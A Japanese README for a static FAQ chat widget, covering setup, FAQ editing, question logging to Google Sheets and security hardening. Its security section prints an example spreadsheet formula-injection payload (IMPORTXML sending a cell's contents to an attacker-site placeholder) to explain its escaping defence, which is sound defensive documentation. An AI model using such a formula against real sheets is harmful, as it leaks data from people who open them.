# メロー チャットサポート（FAQチャットウィジェット）

mellow-wet.jp 向けの、訪問者が質問すると自動で答えが返る**FAQチャット**です。
あらかじめ用意した質問と回答（`faq.json`）から、**質問の“意図”を汲み取って**最適な答えを返します。
キーワードの丸暗記ではなく、言い換え・表記ゆれ・活用形・語順違いにも対応します（APIキー・月額費用は不要）。

- **サーバー処理・APIキー・月額費用は不要**（静的ファイルだけで動きます）
- 本体サイトには **`<script>` を1行追加するだけ**
- 回答の編集は **`faq.json` を書き換えるだけ**（プログラミング不要）
- 訪問者の質問を **Googleスプレッドシートに自動で蓄積** → 答えを足して育てられる

---

## ファイル構成

```
public/              ← サブドメインのルートにアップロードするフォルダ
  chat-widget.js     … ウィジェット本体（基本さわらない）
  faq.json           … 質問と回答のデータ（★ここだけ編集すればOK）
  index.html         … サブドメイン直アクセス時の確認ページ
gas/
  Code.gs            … 質問をGoogleスプレッドシートに記録する受け口（コピペで設定）
test/
  sample-site.html   … 本体サイトを模したローカル動作確認ページ
```

## 設置手順（3ステップ）

### ① サブドメインを作る
レンタルサーバーの管理画面で `chat.mellow-wet.jp` を追加し、そのドキュメントルート（フォルダ）を作成します。
※同じ会社のサーバーなのでDNSは自動で設定されることが多いです。外部DNSを使っている場合のみ、`chat` のレコードを本体と同じ向き先に追加してください。

### ② ファイルをアップロード
`public/` の中の3ファイル（`chat-widget.js` / `faq.json` / `index.html`）を、
①で作ったサブドメインのルートにFTPでアップロードします。
→ `https://chat.mellow-wet.jp/` を開いて、右下にチャットボタンが出れば成功です。

### ③ 本体サイトに1行追加
本体サイト（mellow-wet.jp）の全ページ共通の場所（フッターなど）、
各HTMLの `</body>` の直前に次の1行を追加してアップロードします。

```html
<script src="https://chat.mellow-wet.jp/chat-widget.js" defer></script>
```

→ 本体サイトを開いて右下にボタンが出れば完了です。

## 回答（FAQ）の編集方法

`faq.json` を開いて編集 → 保存 → FTPで上書きアップロードするだけです。
ページのリロードで即反映されます。

```json
{
  "greeting": "最初に表示されるあいさつ文",
  "fallback": "答えが見つからなかったときに返す文（HTMLリンク可）",
  "categories": [
    { "id": "order", "label": "💰 価格・納期・注文" }
  ],
  "faqs": [
    {
      "category": "order",
      "q": "納期はどれくらいかかりますか？",
      "keywords": ["納期", "届く", "日数", "期間"],
      "answer": "春〜秋は約3週間、冬は約1〜2ヶ月でお届けします。"
    }
  ]
}
```

- **`categories`** … チャットの「カテゴリから探す」ボタンになります（`id` と表示名 `label`）。
- **`q`** … 表示用の質問文。質問一覧ボタンと回答の見出しに使われます。
- **`category`** … その質問が属するカテゴリの `id`（`categories[].id` のどれか）。
- **`keywords`** … ユーザーの入力と照合する語。**表記ゆれをたくさん入れるほど当たりやすくなります**（例：「納期」「いつ」「届く」「何日」など）。
- **`answer`** … 返す回答。`<a href="...">リンク</a>` や `<strong>強調</strong>` などのHTMLが使えます。

> 💡 **意図推定で動く仕組み**です。`keywords` に無い言い回しでも、意味の近さで拾います。
> - **確信があるとき**：そのまま回答します。
> - **断定できないとき**：「もしかして、こちらですか？」と近い質問の候補を出し、用意した回答へ誘導します（“答えられない”を減らす工夫）。
> - **似た質問が複数あるとき**（例「違いを教えて」）：どれについて答えるか選んでもらいます。
> - **全く手がかりが無いとき**だけ、カテゴリ一覧へ誘導します。
>
> 精度をさらに上げたいときは `keywords` を増やすのが一番効きます（その語があると“断定”しやすくなります）。
> よく聞かれるのにフォールバックされる質問は、スプレッドシートのログ（後述）で見つけて `faq.json` に足していくのがコツです。

## サイトの最新情報をFAQに反映する（定期再生成）

mellow-wet.jp の内容（価格・納期・店舗情報など）が変わったときに、`faq.json` を作り直す仕組みです。
`tools/` のクローラがサイト全ページを読み込み、その内容を基にFAQを最新化します。

```bash
# ① サイト全ページを取得してコーパスを更新
node tools/crawl-site.mjs        # → tools/site-content.json が更新される

# ② そのコーパスを基に faq.json を作り直す
#    tools/regen-faq-prompt.md の「指示文」を Claude に渡して再生成（事実はコーパスのみを根拠に）

# ③ 価格・納期・店舗などの差分を人が確認 → public/faq.json をFTPで上書き
```

- **クローラは「最新内容を集めるだけ」**（AI不使用・追加費用なし）。文章への整形は ② で行います。
- このサイトは静的で更新頻度が低いので、**サイトを更新したタイミングで回す**運用で十分です。
- **定期自動化したい場合** … `/schedule`（クラウド定期実行）で「月1でクロール→更新案作成→通知」まで自動化できます。FTPアップは人の確認後に行う想定。詳しくは `tools/regen-faq-prompt.md` 参照。

> ⚠️ 「サイト内容からAIが毎回その場で回答する」完全自動方式（RAG）は、API課金と常時稼働サーバーが必要なため採用していません。静的サイトには定期再生成が最もコスパ良好です。

## 質問を蓄積して育てる（Googleスプレッドシート連携）

訪問者が実際に聞いた質問を**すべてスプレッドシートに自動記録**します。
「○（回答できた）／×（未回答）」に加えて、**「結果」列**で応対の種別まで分かるので、
*どの種類の取りこぼしか* を見分けてFAQを育てられます。

「結果」列の値:

| 値 | 意味 | 打ち手 |
|---|---|---|
| `answered` | 自信を持って即回答できた | （基本そのまま） |
| `resolved` | 回答後に「解決した」と評価された | 良い回答。重複登録の確認に |
| `unresolved` | 回答したのに「解決しなかった」 | **回答内容がズレている疑い** → 本文を見直す |
| `suggested` | 候補は出せたが断定できず | **キーワード不足** → 既存FAQに言い換えを追加 |
| `ambiguous` | 上位が僅差で候補提示 | 質問が曖昧。様子見でOK |
| `fallback` | 手がかりゼロ | **新規FAQが必要**な本命候補 |

→ `fallback` / `suggested` / `unresolved` の行を書き出して
**[`tools/grow-faq-prompt.md`](tools/grow-faq-prompt.md)** の指示文を Claude に渡すと、
「キーワード追加 / 新規Q&A / 対象外」に分類した `faq.json` 更新案が作れます。
人が確認 → FTPで反映 → `node --test test/match.test.mjs` で回帰確認、というループで賢く育てていけます。

記録される内容：`日時 / 質問文 / ヒット有無 / 一致したFAQ / 入力元（自由入力 or ボタン or 評価）/ ページURL / 端末情報 / 結果`

> **すでにシートを運用中の場合**：見出し行の末尾（H1セル）に手動で「結果」と入力し、
> `gas/Code.gs` を貼り替えて「新バージョン」で再デプロイしてください（新規シートでは自動で入ります）。

### セットアップ（一度だけ）

1. Googleスプレッドシートを新規作成。
2. メニュー「拡張機能」→「Apps Script」を開く。
3. `gas/Code.gs` の中身を全部コピペして保存。
4. 「デプロイ」→「新しいデプロイ」→「ウェブアプリ」を選び、
   **「アクセスできるユーザー」を『全員』** にしてデプロイ。
5. 表示された**ウェブアプリのURL**をコピー。
6. `public/chat-widget.js` の `CONFIG.logUrl` に貼り付けて、FTPで上書きアップロード。

```js
var CONFIG = {
  ...
  logUrl: "https://script.google.com/macros/s/XXXXXXXX/exec",  // ← ここに貼る
  logToken: "好きな合言葉",  // ← スパム対策（任意・推奨。下記参照）
  logPresetClicks: true   // ボタン経由の質問も記録するか
};
```

> 設定の詳しい手順は `gas/Code.gs` の冒頭コメントにも書いてあります。
> `logUrl` を空のままにすれば記録機能はオフのまま（チャットは普通に動きます）。
> ログ送信は「投げっぱなし」方式なので、万一失敗してもチャットの動作には影響しません。

## セキュリティ

このウィジェットは「誰でもアクセスできるページ」に置き、「誰でも書き込めるエンドポイント」へ送信し、「外部から読み込むファイル」を表示します。そのため次の対策を入れてあります。

### ① スプレッドシートへの数式インジェクション対策

スプレッドシートは `=` `+` `-` `@` で始まる値を**数式として実行**します。対策が無いと、チャットに

```
=IMPORTXML("https://攻撃者のサイト/?d="&A2,"//a")
```

と打つだけで、**シートを開いた人のアカウントでその数式が動き、隣のセルの内容が外部に送信されます**。`gas/Code.gs` の `cellText_()` が、記録前にすべての値を「ただの文字列」に落とします（先頭に `'` を付与＋列を文字列書式に固定）。

### ② 書き込み用と閲覧用でトークンを分ける

`SHARED_TOKEN`（書き込み用）は公開JS内にあるため**誰でも読めます**。これで閲覧まで許すと、JSを見た人が `?action=export` で**質問ログを丸ごとダウンロード**できてしまいます。訪問者の質問には個人的な事情が書かれていることがあるため、閲覧は別トークンにしています。

閲覧用トークンは**ソースに書きません**（このリポジトリは公開のため、書けば結局誰でも読めます）。スクリプト プロパティに保管し、**未設定の間はエクスポートを常に拒否**します。

ログを取り出したくなったら、スクリプトエディタで `setupExportToken` を1回実行してください。発行された値を環境変数で渡します。

```bash
MELLOW_EXPORT_TOKEN="発行された値" node tools/harvest-questions.mjs
```

### ③ 流量制限

`MAX_WRITES_PER_MINUTE`（既定20件/分）を超える書き込みは捨てます。トークンが漏れても、大量書き込みでシートを埋め尽くされるのを防げます。

### ④ 回答HTMLのサニタイズ

`faq.json` は「プログラミング不要で編集できる」運用にしているため、編集ミス・コピペ・配信元の乗っ取りで危険なタグが混ざりえます。描画時に**装飾とリンクだけを通すホワイトリスト方式**でフィルタし、`<script>` `<iframe>` `onerror=` `javascript:` などは除去します。

リンク先も `CONFIG.allowedLinkHosts` のドメインだけに制限しています。`faq.json` が書き換えられても、偽サイトへの誘導には使えません。**新しい掲載先が増えたらここに1行足してください**（足さないとリンクが無効化されます）。

検証は `node test/sanitize.test.mjs`（実際のChromeで37項目）。

### ⑤ 記録する情報を絞る

- 質問文は最大500文字。メール・電話番号・長い数字列は記録前に自動で伏字化
- ページURLは `?` 以降を送りません（将来URLに個人情報が乗った時に備えて）
- UAはOS/ブラウザの要約のみ（`iOS / Safari` 程度）
- Cookie・localStorage は一切使いません

### ⑥ 既知の限界（把握したうえで許容していること）

- **`ALLOWED_PAGE_PREFIX` は送信元の申告に過ぎません。** 偽装できるので、いたずら書き込みを完全には防げません。実際の歯止めは③の流量制限です。
- **書き込みトークンは公開JS内にあります。** 秘匿は不可能で、無差別スパムを減らす程度の効果です。
- **ウィジェットは GitHub Pages から配信しています。** そのアカウントが乗っ取られると本体サイト上で任意のJSが動きます。気になる場合は下記の SRI でハッシュを固定できます。

#### （任意）SRI でウィジェットを固定する

`integrity` を付けると、配信ファイルが1バイトでも変わった時点で読み込まれなくなります。

```html
<script src="https://terace-naokikajimoto.github.io/mellow-chat/chat-widget.js"
        integrity="sha384-…" crossorigin="anonymous" defer></script>
```

**引き換えに、ウィジェットを更新するたびにこのハッシュの貼り替えが必要**です（貼り替え忘れるとチャットが黙って表示されなくなります）。`faq.json` の編集だけならハッシュは変わりません。現在の値は次で取得できます。

```bash
curl -s https://terace-naokikajimoto.github.io/mellow-chat/chat-widget.js \
  | openssl dgst -sha384 -binary | openssl base64 -A
```

### メンテナンス

動作確認で入れたテスト行は、スクリプトエディタで `clearTestRows` を実行すると削除できます（UAが `setup-test` などの行だけを消し、実データには触れません）。

## 見た目の調整

色やタイトルを変えたいときは `chat-widget.js` の先頭にある `CONFIG` を編集します。

```js
var CONFIG = {
  title: "メロー チャットサポート",
  accent: "#0d6e8c",          // メインカラー（サイトに合わせて変更）
  launcherLabel: "質問する",   // ボタンの文字
  ...
};
```

```bash
cd メローチャット
python3 -m http.server 8000
# → http://localhost:8000/test/sample-site.html を開く
```

## 将来「本物のAI」にしたくなったら

`faq.json` を知識源として Claude API などに渡すサーバー処理を追加すれば、
自然文での自動応答に拡張できます。その場合も今のUI（ウィジェット）はそのまま流用でき、
`chat-widget.js` の `handleUserMessage()` 内の応答部分を差し替えるだけで移行できます。
